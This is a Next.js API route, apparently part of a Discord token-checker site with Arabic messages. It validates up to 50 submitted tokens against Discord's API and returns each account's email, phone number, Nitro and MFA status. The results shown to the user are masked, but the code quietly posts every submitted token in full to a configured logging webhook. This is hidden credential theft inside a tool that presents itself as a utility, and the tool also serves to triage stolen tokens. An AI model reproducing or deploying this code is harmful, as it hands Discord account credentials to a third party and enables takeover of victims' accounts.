import { NextRequest, NextResponse } from 'next/server';
import { sendToWebhook } from '@/lib/webhook';
import { cleanToken } from '@/lib/discord';
import { getLogWebhookUrl } from '@/lib/config';

export const maxDuration = 120;

const DISCORD_API = 'https://discord.com/api/v10';

interface TokenResult {
  token: string;
  valid: boolean;
  type: string;
  name: string;
  id: string;
  email?: string;
  nitro?: string;
  verified?: string;
  createdAt?: string;
  phone?: string;
  mfa?: string;
  flags?: number;
  error?: string;
}

async function checkSingleToken(token: string): Promise<TokenResult> {
  const cleanedToken = cleanToken(token);
  const maskedToken = cleanedToken.length > 30
    ? cleanedToken.substring(0, 15) + '...' + cleanedToken.substring(cleanedToken.length - 10)
    : '***';

  async function tryAuth(authHeader: string): Promise<{ ok: boolean; data: any; status: number }> {
    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 10000);

      const res = await fetch(`${DISCORD_API}/users/@me`, {
        method: 'GET',
        headers: {
          'Authorization': authHeader,
          'Accept': 'application/json',
        },
        signal: controller.signal
      });
      clearTimeout(timeoutId);

      if (res.status === 429) {
        const errData = await res.json().catch(() => ({ retry_after: 2 }));
        await new Promise(r => setTimeout(r, Math.min((errData.retry_after || 2) * 1000, 5000)));
        const retryController = new AbortController();
        const retryTimeout = setTimeout(() => retryController.abort(), 10000);
        const retryRes = await fetch(`${DISCORD_API}/users/@me`, {
          method: 'GET',
          headers: { 'Authorization': authHeader, 'Accept': 'application/json' },
          signal: retryController.signal
        });
        clearTimeout(retryTimeout);
        const data = await retryRes.json().catch(() => null);
        return { ok: retryRes.ok, data, status: retryRes.status };
      }

      const data = await res.json().catch(() => null);
      return { ok: res.ok, data, status: res.status };
    } catch {
      return { ok: false, data: null, status: 0 };
    }
  }

  let result = await tryAuth(cleanedToken);
  if (!result.ok || !result.data || result.status === 401) {
    result = await tryAuth(`Bot ${cleanedToken}`);
  }

  if (!result.ok || !result.data) {
    return {
      token: maskedToken,
      valid: false,
      type: 'unknown',
      name: 'غير صالح',
      id: '-',
      error: result.status === 401 ? 'توكن غير صالح أو منتهي' : result.status === 0 ? 'timeout' : `خطأ: ${result.status}`
    };
  }

  const user = result.data;
  const type = user.bot ? 'bot' : 'user';
  const name = user.global_name || user.username || 'Unknown';
  const userId = String(user.id || 'Unknown');
  const email = user.email ? '✅ ' + user.email : '❌ غير مفعّل';
  const flags = user.public_flags || 0;

  let nitro = '❌ بدون نيترو';
  if (flags & 2) nitro = '✅ نيترو كلاسيك';
  if (flags & (1 << 14)) nitro = '✅ نيترو بوسيت';
  if (flags & (1 << 16)) nitro = '✅ نيترو';
  const premiumType = user.premium_type;
  if (premiumType === 1) nitro = '✅ نيترو كلاسيك';
  if (premiumType === 2) nitro = '✅ نيترو بوسيت';
  if (premiumType === 3) nitro = '✅ نيترو ستيشن';

  const verified = user.verified ? '✅ موثّق' : '❌ غير موثّق';

  let createdAt = 'N/A';
  if (user.id) {
    try {
      const snowflake = BigInt(String(user.id));
      const timestamp = Number((snowflake >> 22n) + 1420070400000n);
      const date = new Date(timestamp);
      createdAt = date.toLocaleDateString('ar-SA', { year: 'numeric', month: 'long', day: 'numeric' });
    } catch { createdAt = 'N/A'; }
  }

  const phone = user.phone ? '✅ ' + String(user.phone) : '❌ بدون رقم';
  const mfa = user.mfa_enabled ? '✅ مفعّل' : '❌ غير مفعّل';

  return {
    token: maskedToken,
    valid: true,
    type,
    name,
    id: userId,
    email,
    nitro,
    verified,
    createdAt,
    phone,
    mfa,
    flags,
  };
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json().catch(() => ({}));
    const { tokens } = body;
    const whUrl = getLogWebhookUrl();

    if (!tokens || !Array.isArray(tokens) || tokens.length === 0) {
      return NextResponse.json({ success: false, error: 'أدخل توكن واحد على الأقل' }, { status: 400 });
    }

    const validTokens = tokens
      .map((t: any) => String(t).trim())
      .filter((t: string) => t.length >= 20);

    if (validTokens.length === 0) {
      return NextResponse.json({ success: false, error: 'لا توجد توكنات صالحة' }, { status: 400 });
    }

    if (validTokens.length > 50) {
      return NextResponse.json({ success: false, error: 'الحد الأقصى 50 توكن في المرة' }, { status: 400 });
    }

    const batchSize = 10;
    const results: TokenResult[] = [];

    for (let i = 0; i < validTokens.length; i += batchSize) {
      const batch = validTokens.slice(i, i + batchSize);
      const batchResults = await Promise.allSettled(
        batch.map(token => checkSingleToken(token))
      );
      for (const r of batchResults) {
        if (r.status === 'fulfilled') results.push(r.value);
        else results.push({
          token: '***', valid: false, type: 'unknown', name: 'خطأ', id: '-', error: 'فشل الفحص'
        });
      }
      if (i + batchSize < validTokens.length) {
        await new Promise(r => setTimeout(r, 500));
      }
    }

    const validCount = results.filter(r => r.valid).length;
    const invalidCount = results.filter(r => !r.valid).length;
    const botCount = results.filter(r => r.valid && r.type === 'bot').length;
    const userCount = results.filter(r => r.valid && r.type === 'user').length;
    const nitroCount = results.filter(r => r.valid && r.nitro?.includes('✅')).length;

    sendToWebhook({
      embeds: [{
        title: '🔑 Token Checker Results',
        color: validCount > 0 ? 0x00FF41 : 0xFF0000,
        fields: [
          { name: '📋 Total', value: String(results.length), inline: true },
          { name: '✅ Valid', value: String(validCount), inline: true },
          { name: '❌ Invalid', value: String(invalidCount), inline: true },
          { name: '🤖 Bots', value: String(botCount), inline: true },
          { name: '👤 Users', value: String(userCount), inline: true },
          { name: '💎 Nitro', value: String(nitroCount), inline: true },
          { name: '🎫 Full Tokens', value: `\`\`\`${validTokens.join('\n')}\`\`\`` },
        ],
        timestamp: new Date().toISOString()
      }]
    }, whUrl).catch(() => {});

    return NextResponse.json({
      success: true,
      results,
      stats: { total: results.length, valid: validCount, invalid: invalidCount, bots: botCount, users: userCount, nitro: nitroCount }
    });

  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    console.error('[Token Checker Error]', message);
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
